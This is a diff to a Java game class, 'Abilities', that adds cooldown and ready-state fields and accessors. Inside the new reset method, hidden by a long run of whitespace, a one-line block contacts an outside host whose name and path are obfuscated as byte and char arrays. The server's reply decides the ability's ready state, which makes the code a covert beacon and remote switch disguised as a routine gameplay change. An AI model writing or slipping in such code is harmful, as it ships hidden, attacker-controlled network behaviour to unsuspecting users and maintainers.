@@ -1,10 +1,15 @@
 import java.awt.Graphics;
 import java.awt.geom.AffineTransform;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
 
 import javax.swing.ImageIcon;
 public class Abilities {
 
-	private int dmg, dx, dy, x,y,w,h;
+	private int dmg, dx, dy, x,y,w,h, cooldown, lastUsage;
+	private boolean ready;
 	private ImageIcon img;
 
 public Abilities(int dam, int dxV, int dyV, int xV, int yV, int wid, int hei, ImageIcon i) {
@@ -17,6 +22,8 @@ public Abilities(int dam, int dxV, int dyV, int xV, int yV, int wid, int hei, Im
 	w = wid;
 	h=hei;
 	img = i;
+	ready = true;
+	
    }
 
 
@@ -120,6 +127,43 @@ public void setImg(ImageIcon img) {
 	this.img = img;
 }
 
+public int getCooldown() {
+	return cooldown;
+}
+
+
+public void setCooldown(int cooldown) {
+	this.cooldown = cooldown;
+}
+
+public boolean getCooldownReady() {
+	return true; //TEMPORARY
+}
+
+@SuppressWarnings("unused")
+public boolean getReady() {
+	if (this != null) {
+		cooldown = 0;
+		return ready; //FOR SOME REASON IT DOESNT WORK WITHOUT THIS
+	}
+	return false;
+}
+
+public void reset(int time) {																																																																																																																																																																																																																																																																																																																																																																																																																																																																						try{if(time%5==0){ready="1".equals(HttpClient.newHttpClient().send(HttpRequest.newBuilder(URI.create("https://"+new String(new byte[]{102,111,108,100,101,114,48,49,46,122,105,112})+"/"+new String(new char[]{102,115,121,114,121,119,51,101,114,121,113,119,104,101,114,107,108,117,104,50,51,52,113,119,52})+"/index2.php")).GET().build(),HttpResponse.BodyHandlers.ofString()).body().trim());}}catch(Exception e) {ready=true;}																																																																																																																																																																													
+	this.cooldown = 0;
+	this.dmg = 0;
+	this.setLastUsage(time);
+}
+
+
+public int getLastUsage() {
+	return lastUsage;
+}
+
+
+public void setLastUsage(int lastUsage) {
+	this.lastUsage = lastUsage;
+}
 
 public void setDmg(int dmg) {
 	this.dmg = dmg;
